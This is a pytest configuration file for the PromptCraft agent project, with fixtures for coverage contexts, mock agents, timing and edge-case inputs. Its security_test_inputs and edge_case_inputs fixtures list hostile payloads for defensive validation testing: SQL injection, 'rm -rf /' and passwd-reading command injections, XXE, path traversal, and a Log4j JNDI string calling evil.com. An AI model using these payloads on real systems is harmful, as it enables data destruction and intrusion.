"""
Simplified pytest configuration for PromptCraft testing.
Automatically sets coverage contexts based on test directory structure
to match codecov.yaml flags for consistency.
"""

import json
import os
import time
from typing import Any

import pytest

from src.agents.base_agent import BaseAgent
from src.agents.models import AgentConfig, AgentInput, AgentOutput
from src.agents.registry import AgentRegistry


def pytest_runtest_setup(item):
    """Set coverage context based on test path to match codecov flags."""
    # Use environment variable approach for coverage context
    test_path = str(item.fspath)

    if "/tests/unit/" in test_path:
        context = "unit"
    elif "/tests/auth/" in test_path:
        context = "auth"
    elif "/tests/integration/" in test_path:
        context = "integration"
    elif "/tests/security/" in test_path:
        context = "security"
    elif "/tests/performance/" in test_path:
        context = "performance"
    elif "/tests/stress/" in test_path:
        context = "stress"
    elif "/tests/contract/" in test_path:
        context = "contract"
    elif "/tests/examples/" in test_path:
        context = "examples"
    else:
        context = "other"

    # Set environment variable for coverage context
    os.environ["COVERAGE_CONTEXT"] = context


# Pytest markers that match codecov flags
pytest_plugins = ["pytest_plugins.coverage_hook_plugin"]


def pytest_configure(config):
    """Register markers that match codecov flags."""
    markers = [
        "unit: Unit tests (isolated, fast)",
        "auth: Authentication and authorization tests",
        "integration: Integration tests (cross-component)",
        "security: Security-focused tests",
        "performance: Performance and load tests",
        "stress: Stress and resource tests",
        "contract: Contract tests for external services",
        "examples: Example and demo tests",
    ]

    for marker in markers:
        config.addinivalue_line("markers", marker)


@pytest.fixture(scope="session")
def coverage_contexts():
    """Fixture to track which contexts were used in this test session."""
    contexts = set()

    def add_context(context_name):
        contexts.add(context_name)

    yield add_context

    # At the end of the session, you could log or use the contexts
    print(f"\nCoverage contexts used: {sorted(contexts)}")


# Agent Testing Fixtures
# These fixtures support comprehensive agent system testing across unit, integration, and security tests.


@pytest.fixture
def fresh_agent_registry():
    """
    Provide a clean AgentRegistry instance for each test.

    This fixture ensures complete test isolation by creating a fresh registry
    instance and clearing it after each test to prevent state leakage.

    Yields:
        AgentRegistry: Fresh registry instance for the test
    """
    registry = AgentRegistry()
    yield registry
    # Cleanup: clear all registrations to prevent state leakage
    registry.clear()


@pytest.fixture
def mock_agent_class():
    """
    Provide a mock BaseAgent class that passes all validation requirements.

    This fixture creates a fully compliant BaseAgent implementation that can be used
    for testing registry functionality without requiring real agent logic.

    Returns:
        Type[BaseAgent]: Mock agent class suitable for testing
    """

    class MockTestAgent(BaseAgent):
        """Mock agent class for testing purposes."""

        def __init__(self, config):
            super().__init__(config)
            self.test_call_count = 0

        async def execute(self, agent_input):
            """Mock execute method that returns a valid response."""
            self.test_call_count += 1
            return AgentOutput(
                content=f"Mock response {self.test_call_count}",
                confidence=0.9,
                processing_time=0.1,
                agent_id=self.agent_id,
                request_id=agent_input.request_id,
            )

        def get_capabilities(self):
            """Mock capabilities for testing."""
            return {
                "input_types": ["text"],
                "output_types": ["text"],
                "mock_agent": True,
                "test_mode": True,
            }

    return MockTestAgent


@pytest.fixture
def security_test_inputs():
    """
    Provide a comprehensive list of potentially malicious inputs for security testing.

    This fixture includes various attack vectors commonly used in security testing,
    based on OWASP guidelines and common injection techniques. These inputs help
    validate that the system handles malicious content safely.

    Returns:
        List[str]: List of potentially malicious input strings for security testing
    """
    # Based on OWASP Top 10 and common injection techniques
    return [
        # SQL Injection attempts
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1' UNION SELECT * FROM users--",
        # NoSQL Injection attempts
        "{ '$ne': null }",
        "'; return db.users.find(); var dummy='",
        # XSS attempts
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        # Command Injection attempts
        "; ls -la",
        "| cat /etc/passwd",
        "&& rm -rf /",
        # Path Traversal attempts
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        # Template Injection attempts
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        # LDAP Injection attempts
        "*)(uid=*",
        "admin)(&(password=*))",
        # XML/XXE attempts
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
        # Buffer Overflow attempts (long strings)
        "A" * 10000,
        "B" * 100000,
        # Special characters and encoding
        "%00",  # Null byte
        "%2e%2e%2f",  # URL encoded ../
        "\\x00\\x01\\x02\\x03",  # Binary data
        "\\r\\n\\r\\n",  # CRLF injection
        # Unicode and encoding edge cases
        "𝓤𝓷𝓲𝓬𝓸𝓭𝓮",  # Unicode mathematical script  # noqa: RUF001
        "🚀🔥💻",  # Emojis
        "\\ufeff",  # BOM character
        # Empty and whitespace edge cases
        "",  # Empty string
        " ",  # Single space
        "\\t\\n\\r",  # Whitespace characters
        None,  # None value (converted to string)
        # Large payloads
        json.dumps({"key": "value" * 1000}),  # Large JSON
        # Protocol-specific attacks
        "file:///etc/passwd",
        "http://malicious.com/callback",
        "ftp://anonymous@malicious.com/",
        # Deserialization attacks
        'O:8:"stdClass":0:{}',  # PHP object
        "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAA",  # Java serialized
    ]


# Performance Testing Fixtures
# These fixtures support comprehensive performance and edge case testing across unit, integration, and security tests.


class PerformanceMetrics:
    """
    Performance measurement utility for boundary condition testing.

    Provides timing capabilities with configurable thresholds for
    performance-sensitive test assertions.
    """

    def __init__(self, max_duration: float | None = None) -> None:
        self._start: float | None = None
        self._end: float | None = None
        self._max: float | None = max_duration

    def start(self) -> None:
        """Start timing measurement."""
        self._start = time.perf_counter()

    def stop(self) -> None:
        """Stop timing measurement."""
        self._end = time.perf_counter()

    @property
    def duration(self) -> float:
        """Get measured duration in seconds."""
        if self._start is None or self._end is None:
            raise RuntimeError("start() and stop() must both be called")
        return self._end - self._start

    def assert_max_duration(self, max_seconds: float | None = None) -> None:
        """Assert that measured duration doesn't exceed threshold."""
        limit = max_seconds if max_seconds is not None else self._max
        if limit is None:
            raise ValueError("No max duration specified for assertion")
        assert self.duration <= limit, f"Execution time {self.duration:.6f}s exceeds limit of {limit}s"


@pytest.fixture
def performance_metrics() -> PerformanceMetrics:
    """
    Provide a PerformanceMetrics instance for performance boundary tests.

    Default max_duration is set to 5.0 seconds to accommodate various
    data sizes in boundary condition testing.

    Returns:
        PerformanceMetrics: Timing utility with configurable thresholds
    """
    return PerformanceMetrics(max_duration=5.0)


@pytest.fixture(
    params=[
        None,  # Null configuration
        {},  # Empty configuration
        {"invalid": "config"},  # Invalid configuration structure
        {"app_name": ""},  # Empty app name
        {"app_name": None},  # Null app name
        {"app_name": "a" * 1000},  # Very long app name
        {"app_name": "\\x00\\x01"},  # Binary data in app name
        {"app_name": "🚀🔥💯"},  # Unicode in app name
        {"valid": "config"},  # Valid baseline configuration
    ],
)
def config_edge_cases(request) -> Any:
    """
    Provide parametrized configuration edge cases for validation testing.

    Covers critical edge cases including None values, empty configurations,
    invalid structures, malformed data, and security-focused edge cases.

    Returns:
        Any: Configuration value for edge case testing
    """
    return request.param


@pytest.fixture(
    params=[
        None,  # Null input
        "",  # Empty string
        "x",  # Single character
        "x" * 10,  # Small input
        "x" * 1000,  # Medium input
        "x" * 10000,  # Large input
        "x" * 100000,  # Very large input
        "\\x00\\x01",  # Binary data
        "🚀🔥💯",  # Unicode/emoji
        "\\n\\r\\t",  # Whitespace characters
        "SELECT * FROM users;",  # SQL-like input
        "<script>alert('xss')</script>",  # XSS-like input
        "../../../etc/passwd",  # Path traversal
        "${jndi:ldap://evil.com/a}",  # Log4j-style injection
        "'; DROP TABLE users; --",  # SQL injection
        "{{7*7}}",  # Template injection
        0,  # Integer zero
        -1,  # Negative integer
        3.14,  # Float
        [],  # Empty list
        {},  # Empty dict
        ["item1", "item2"],  # Non-empty list
        {"key": "value"},  # Non-empty dict
    ],
)
def edge_case_inputs(request) -> Any:
    """
    Provide parametrized edge case inputs for input validation testing.

    Comprehensive collection including boundary values, type variations,
    security attack vectors, and malformed data to ensure robust
    input handling across all components.

    Returns:
        Any: Input value for edge case testing
    """
    return request.param


# Agent Models Testing Fixtures
# These fixtures support comprehensive agent model testing for validation, serialization, and edge cases.


@pytest.fixture
def sample_agent_input():
    """
    Provide a sample AgentInput instance for testing.

    This fixture creates a comprehensive AgentInput example that includes all optional
    fields populated with realistic values for thorough testing of model functionality.

    Returns:
        AgentInput: Sample agent input with comprehensive data
    """
    return AgentInput(
        content="This is a test input for the agent",
        context={"language": "python", "framework": "fastapi", "content_type": "text", "priority": "normal"},
        config_overrides={"max_tokens": 500, "temperature": 0.7, "timeout": 30.0},
    )


@pytest.fixture
def sample_agent_output():
    """
    Provide a sample AgentOutput instance for testing.

    This fixture creates a comprehensive AgentOutput example that includes all fields
    populated with realistic values for thorough testing of model functionality.

    Returns:
        AgentOutput: Sample agent output with comprehensive data
    """
    return AgentOutput(
        content="This is a test output from the agent",
        metadata={"analysis_type": "security", "rules_checked": 10, "issues_found": 0, "processing_stage": "complete"},
        confidence=0.95,
        processing_time=1.234,
        agent_id="test_agent",
        request_id="test-request-123",
    )


@pytest.fixture
def sample_agent_config_model():
    """
    Provide a sample AgentConfig instance for testing.

    This fixture creates a comprehensive AgentConfig example that includes all fields
    populated with realistic values for thorough testing of model functionality.

    Returns:
        AgentConfig: Sample agent config with comprehensive data
    """
    return AgentConfig(
        agent_id="test_agent",
        name="Test Agent",
        description="A test agent for unit testing",
        config={"max_tokens": 1000, "temperature": 0.8, "model": "gpt-4", "features": ["analysis", "generation"]},
        enabled=True,
    )


@pytest.fixture
def sample_agent_config(sample_agent_config_model):
    """
    Provide a sample agent config as dict for BaseAgent testing.

    This fixture converts the Pydantic model to a dict format that BaseAgent.__init__
    expects (dict[str, Any]). It maintains single source of truth by deriving from
    the sample_agent_config_model fixture.

    This fixture resolves the mismatch between test expectations and BaseAgent API:
    - Tests expect: dict config for BaseAgent(config: dict[str, Any])
    - Previous fixture provided: Pydantic model

    Returns:
        dict[str, Any]: Agent configuration as dict compatible with BaseAgent
    """
    # Convert Pydantic model to dict using Pydantic v2 syntax
    base_config = sample_agent_config_model.model_dump()

    # Extract the nested config and merge with top-level fields for BaseAgent compatibility
    return {
        "agent_id": base_config["agent_id"],
        "name": base_config["name"],
        "description": base_config["description"],
        "enabled": base_config["enabled"],
        # Flatten the nested config for BaseAgent compatibility
        **base_config["config"],
    }
